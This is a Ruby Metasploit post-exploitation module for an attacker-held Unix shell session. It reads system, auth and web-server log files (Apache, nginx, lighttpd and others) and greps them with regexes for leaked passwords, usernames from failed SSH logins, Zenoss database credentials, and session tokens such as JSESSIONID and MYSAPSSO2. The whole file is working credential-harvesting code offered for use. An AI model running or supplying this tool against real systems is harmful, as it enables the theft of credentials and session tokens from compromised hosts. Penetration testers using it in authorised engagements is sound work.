require 'msf/core'
require 'msf/core/post/file'
require 'core/post/staekka'
require 'core/post/staekka/file'
require 'core/post/staekka/unix'
require 'core/post/unix/commands'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Staekka
  include Msf::Post::Staekka::Unix
  include Msf::Post::Unix::Commands
  include Msf::Post::Updatedb

  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Grep Interssting Data from Logfiles',
                      'Description'   => %q(Analyse log files),
                      'Author'        => [ 'jot'],
                      'SessionTypes'  => [ 'shell' ]))
    register_options(
      [
        OptBool.new('USE_UPDATEDB', [ false, 'Use an updatedb database and search for filenames instead of full path', true]),
        OptString.new('FILES', [ false, 'A special log file'])
      ], self.class
    )
  end

  def run
    all_log_files.each do |file|
      data = read_logfile(file)
      if data.nil?
        vprint_warning("Cannot read file '#{file}'")
        next
      end
      vprint_status("Checking logfile '#{file}'")
      grep_passwords(data, file)
    end
  end

  def all_log_files
    out = []
    files = if datastore['FILES']
              datastore['FILES'].split(" ")
            else
              log_files_syslog + log_files_web
            end

    files.flatten!
    files.compact!
    files.uniq!

    files.each do |file|
      file.strip!
      next if file.empty?
      if (file.start_with? '/') || (file.start_with? './') || (file.start_with? '..')
        out << file if exists?(file)
      else
        # search updatedb
        out.concat find_files(file)
      end
    end
    out
  end

  def log_files_syslog
    [
      '/var/log/messages',
      '/var/log/auth.log',
      '/var/log/auth',
      '/var/log/debug',
      '/var/log/ssh.log',
      '/var/log/ssh',
      '/var/log/debug.log',
      '/var/log/audit',
      '/var/log/audit.log',
      '/var/log/kernel',
      '/var/log/kernel.log',
    ]
  end

  def log_files_web
    [
      '/var/log/apache2/access',
      '/var/log/apache2/access.log',
      '/var/log/apache2/error',
      '/var/log/apache2/error.log',
      '/var/log/apache2/ssl_access',
      '/var/log/apache2/ssl_access.log',
      '/var/log/apache2/ssl_error',
      '/var/log/apache2/ssl_error.log',
      '/var/log/apache/access',
      '/var/log/apache/access.log',
      '/var/log/apache/error',
      '/var/log/apache/error.log',
      '/var/log/apache/ssl_access',
      '/var/log/apache/ssl_access.log',
      '/var/log/apache/ssl_error',
      '/var/log/apache/ssl_error.log',
      '/var/log/httpd/access',
      '/var/log/httpd/access.log',
      '/var/log/httpd/error',
      '/var/log/httpd/error.log',
      '/var/log/httpd/ssl_access',
      '/var/log/httpd/ssl_access.log',
      '/var/log/httpd/ssl_error',
      '/var/log/httpd/ssl_error.log',
      '/var/log/web/access',
      '/var/log/web/access.log',
      '/var/log/web/error',
      '/var/log/web/error.log',
      '/var/log/web/ssl_access',
      '/var/log/web/ssl_access.log',
      '/var/log/web/ssl_error',
      '/var/log/web/ssl_error.log',
      #
      '/var/log/lighttpd/access.log',
      '/var/log/lighttpd/error.log',
      '/var/log/thttpd.log',
      '/var/log/nginx/access.log',
      '/var/log/nginx/error.log',
    ]
  end

  def read_logfile(file)
    data = nil
    if readable?(file)
      print_good(file + " is readable")
      data = read_file(file, false, true)
    end
    data
  end

  def grep_signature(data, signatures, file)
    data.each_line do |line|
      line.strip!
      signatures.each_pair do |search, message|
        rx = Regexp.new(search)
        out = rx.match(line)
        next unless out
        print_status(message + " in file " + file + " : " + line)
        vprint_status("Search: " + search)
        found = out[1]
        print_good "Found: #{found}" unless found.nil? || found.empty?
      end
    end
  end

  # TODO: find more patterns
  def grep_passwords(data, file)
    signatures = { 'ZENHOME/libexec/poll_postgres.py\s.*?\s.*?\s.*?\s\'(.*?)\'' => 'password?',
                   'Failed\spassword\sfor\sinvalid\suser\s(.*?)\sfrom\s' => 'password or invalid user (bruteforce attack)',
                   'password=(.*?)' => 'Password as parameter?',
                   '<password>(.*?)<\/password>' => 'Password?',
                   'j_password' => 'Password?',
                   'j_sap_password' => 'Password?',
                   'j_sap_again' => 'Password?',
                   'oldPassword' => 'Password?',
                   'confirmNewPassword' => 'Password?',
                   'jsessionid' => 'Session',
                   'JSESSIONID' => 'Session',
                   'MYSAPSSO2' => 'Session' }
    grep_signature(data, signatures, file)
  end
end
